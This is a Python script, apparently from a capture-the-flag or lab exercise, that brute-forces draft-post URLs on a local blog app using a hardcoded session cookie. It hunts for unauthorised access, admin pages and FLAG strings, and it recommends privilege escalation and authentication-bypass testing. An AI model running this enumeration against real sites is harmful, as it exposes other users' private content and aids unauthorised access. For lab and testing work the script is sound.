import requests
import time
import re

# Configuration with conservative settings
BASE_URL = "http://127.0.0.1:5000"
SESSION_COOKIE = "eyJfZnJlc2NoIjp0cnVlLCJ1c2VyX2lkIjoyfQ.Z3r1jw.8j7dK6F9m3pXqR2sT5vN8wY1aZ4b"
REQUEST_DELAY = 0.2  # 200ms delay between requests

# Setup session
session = requests.Session()
session.cookies.set('session', SESSION_COOKIE)
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

print("=== BLOG ENDPOINT DISCOVERY (CONSERVATIVE) ===\n")
print("Testing connection...")

# Test base URL first to confirm connectivity
try:
    response = session.get(BASE_URL, timeout=10)
    print(f"✓ Base URL accessible: {response.status_code}")
    print(f"  Response size: {len(response.content)}B")
except Exception as e:
    print(f"✗ Base URL failed: {e}")

print(f"\nStarting systematic endpoint discovery with {REQUEST_DELAY}s delays...")
print("="*50)

def test_single_url(url):
    """Test a single URL with full error handling."""
    try:
        time.sleep(REQUEST_DELAY)
        response = session.get(url, timeout=10)
        
        # Analyze response
        indicators = {'admin': False, 'error': False, 'flag': False, 'interesting': []}
        
        text = response.text
        # Check for admin keywords
        if re.search(r'admin\w*|Administrator|moderator|privileged|console|dashboard', text, re.IGNORECASE):
            indicators['admin'] = True
        
        # Check for flags
        if re.search(r'FLAG\{[^}]+\}', text):
            indicators['flag'] = True
            print(f"  [!] FLAG found: {re.search(r'FLAG\{[^}]+\}', text).group()}")
        
        # Check for errors
        if re.search(r'error|exception|traceback|debug', text, re.IGNORECASE) and len(text) < 800:
            indicators['error'] = True
            indicators['interesting'].append('error page')
        
        # Check for substantial content
        if len(response.content) > 500:
            indicators['interesting'].append('substantial content')
        
        return response.status_code, len(response.content), indicators
    except requests.exceptions.Timeout:
        return -1, 0, {'admin': False, 'error': False, 'flag': False, 'interesting': ['timeout']}
    except Exception as e:
        return -2, 0, {'admin': False, 'error': False, 'flag': False, 'interesting': [str(e)]}

# Test most promising patterns first (small sample)
primary_patterns = [
    "/draft/{id}",
    "/drafts/{id}",
    "/api/draft/{id}",
    "/api/drafts/{id}",
    "/post/draft/{id}",
    "/{user}/draft/{id}"
]

print("\n[PHASE 1] Testing primary draft patterns (IDs 1-20)\n")

all_results = []
success_count = 0
error_count = 0
admin_endpoints = []

for pattern in primary_patterns:
    print(f"Testing pattern: {pattern}")
    
    pattern_hits = 0
    # Test a smaller range first (1-20)
    for draft_id in range(1, 21):
        # Test with and without username for user-specific patterns
        if "{user}" in pattern:
            urls_to_test = [
                f"{BASE_URL}{pattern.format(id=draft_id, user='admin')}",
                f"{BASE_URL}{pattern.format(id=draft_id, user='user')}"
            ]
        else:
            urls_to_test = [f"{BASE_URL}{pattern.format(id=draft_id)}"]
        
        for url in urls_to_test:
            status_code, length, indicators = test_single_url(url)
            
            result_info = {
                'pattern': pattern,
                'url': url,
                'id': draft_id,
                'status': status_code,
                'length': length,
                'indicators': indicators
            }
            
            if status_code == 200:
                pattern_hits += 1
                success_count += 1
                
                if indicators['admin']:
                    print(f"  [ADMIN] {url} - {length}B")
                    admin_endpoints.append(result_info)
                elif indicators['flag']:
                    print(f"  [FLAG+] {url} - {length}B")
                elif length > 1000:
                    print(f"  [+] {url} - {length}B (large)")
                else:
                    print(f"  [+] {url} - {length}B")
            
            elif status_code == 403:
                print(f"  [!] {url} - 403 Forbidden")
            
            elif status_code not in [404, 403] and status_code >= 0:
                print(f"  [?] {url} - {status_code} (unusual)")
            
            elif status_code < 0:
                errors = [e for e in indicators['interesting'] if e != 'admin']
                if errors:
                    print(f"  [X] {url} - Error: {errors[0]}")
                error_count += 1
            
            all_results.append(result_info)
    
    if pattern_hits > 0:
        print(f"  → Pattern {pattern}: {pattern_hits} hits\n")
    else:
        print("  → No valid endpoints found\n")

print("="*50)
print("[RESULTS SUMMARY]")
print(f"Total endpoints tested: {len(all_results)}")
print(f"Successful (200): {success_count}")
print(f"Errors/timeouts: {error_count}")

# Analyze by status code
status_codes = {}
for result in all_results:
    code = result['status']
    status_codes[code] = status_codes.get(code, 0) + 1

print(f"\nStatus code distribution:")
for code, count in sorted(status_codes.items()):
    if code == 200:
        print(f"  200 OK: {count}")
    elif code == 403:
        print(f"  403 Forbidden: {count}")
    elif code == 404:
        print(f"  404 Not Found: {count}")
    elif code >= 500:
        print(f"  5xx Server Error: {count}")
    elif code < 0:
        print(f"  Timeouts/Errors: {count}")
    else:
        print(f"  {code}: {count}")

# Show successful patterns
print(f"\nSuccessful patterns found:")
successful_patterns = {}
for result in all_results:
    if result['status'] == 200:
        pattern = result['pattern']
        if pattern not in successful_patterns:
            successful_patterns[pattern] = []
        successful_patterns[pattern].append(result['id'])

# Sort by number of hits
sorted_patterns = sorted(successful_patterns.items(), key=lambda x: len(x[1]), reverse=True)
for pattern, ids in sorted_patterns[:10]:
    print(f"  {pattern}: {len(ids)} accessible drafts (IDs: {sorted(ids)[:10]}{'...' if len(ids) > 10 else ''})")

# Admin indicators
if admin_endpoints:
    print(f"\n[!] ADMIN ENDPOINTS DISCOVERED: {len(admin_endpoints)}")
    for admin in admin_endpoints[:5]:  # Show first 5
        print(f"  {admin['url']} - {admin['length']}B")
else:
    print(f"\n[ADMIN] No admin-specific endpoints detected")

# Flag findings
flag_results = [r for r in all_results if r['indicators']['flag']]
if flag_results:
    print(f"\n[!] FLAGS FOUND: {len(flag_results)} discoveries")
    for flag_result in flag_results:
        print(f"  URL: {flag_result['url']}")
        # Show actual flag
        try:
            resp = session.get(flag_result['url'], timeout=5)
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"  FLAG: {flag_match.group()}")
        except:
            pass
else:
    print(f"\n[FLAG] No flags in accessible endpoints")

# Additional pattern discovery
print(f"\n[EXTENDED PATTERN TESTING]")
extended_patterns = [
    "/draft/{id}/edit",
    "/drafts/{id}/edit",
    "/admin/draft/{id}",
    "/{user}/drafts/{id}",
    "/api/v1/draft/{id}",
    "/blog/draft/{id}",
    "/posts/draft/{id}",
    "/editor/draft/{id}"
]

extended_results = []
print("Testing additional patterns (IDs 1-10)...")

for pattern in extended_patterns:
    pattern_hits = 0
    for draft_id in range(1, 11):
        url = f"{BASE_URL}{pattern.format(id=draft_id, user='admin')}"
        status_code, length, indicators = test_single_url(url)
        
        if status_code == 200:
            pattern_hits += 1
            extended_results.append({
                'pattern': pattern,
                'url': url,
                'id': draft_id,
                'length': length
            })
            print(f"  [+] {pattern} ID {draft_id}: {length}B")
    
    if pattern_hits > 0:
        print(f"  → Pattern {pattern}: {pattern_hits} hits\n")

# Final comprehensive map
print("="*50)
print("[COMPREHENSIVE ENDPOINT MAP]")
print("Format: PATTERN | ACCESSIBLE_COUNT | SAMPLE_IDS")
print("-"*50)

all_patterns = {}
for result in all_results + extended_results:
    pattern = result['pattern']
    if pattern not in all_patterns:
        all_patterns[pattern] = {'count': 0, 'ids': []}
    if result['status'] == 200:
        all_patterns[pattern]['count'] += 1
        all_patterns[pattern]['ids'].append(result['id'])

# Sort by count
top_patterns = sorted(all_patterns.items(), key=lambda x: x[1]['count'], reverse=True)[:15]

for pattern, stats in top_patterns:
    ids = sorted(stats['ids'])
    ids_display = str(ids[:8]) if len(ids) <= 8 else f"[{ids[0]}, {ids[1]}, ..., {ids[-1]}]"
    print(f"{pattern:<28} | {stats['count']:>3} | {ids_display}")

print(f"\n{'='*50}")
print("[ANALYSIS COMPLETE]")
print(f"{'='*50}")

# Summary report
print(f"\n[KEY FINDINGS]")
print(f"  • {len([p for p in all_patterns.values() if p['count'] > 0])} viable endpoint patterns discovered")
print(f"  • {len(admin_endpoints)} endpoints with admin indicators")
print(f"  • {len(flag_results)} potential flag locations")
print(f"  • Most successful pattern: {top_patterns[0][0]} ({top_patterns[0][1]['count']} endpoints)")

print(f"\n[RECOMMENDATIONS]")
print(f"  1. Focus on most successful pattern for deeper enumeration")
if admin_endpoints:
    print(f"  2. Test admin endpoints for privilege escalation")
if flag_results:
    print(f"  3. Investigate flag locations immediately")
print(f"  4. Analyze 403 endpoints for authentication bypass")
print(f"  5. Test discovered patterns with parameter fuzzing")
